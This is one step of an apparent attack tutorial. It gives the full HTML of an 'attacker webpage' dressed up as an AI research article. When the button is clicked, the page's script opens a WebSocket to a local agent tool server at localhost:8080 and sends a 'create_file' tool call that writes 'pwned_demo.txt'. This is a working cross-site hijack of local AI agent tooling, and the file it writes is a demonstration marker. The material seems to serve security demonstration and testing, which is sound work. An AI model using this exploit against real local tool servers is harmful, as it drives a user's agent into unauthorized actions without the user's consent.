Step 2 — Create attacker webpage

Create attacker.html

<!DOCTYPE html>
<html>
<body>
<h1>Interesting AI Research Article</h1>
<button onclick="attack()">
Open Page
</button>
<p id="status"></p>
<script>
async function attack(){
    let ws =
        new WebSocket(
            "ws://localhost:8080"
        )
    ws.onopen = () => {
        document
            .getElementById("status")
            .innerText =
            "Connected"
        ws.send(
            JSON.stringify({
                tool:
                    "create_file",
                args:{
                    filename:
                    "pwned_demo.txt"
                }
            })
        )
    }
    ws.onmessage = (e)=>{
        document
            .getElementById("status")
            .innerText =
            e.data
    }
}
</script>
</body>
</html>

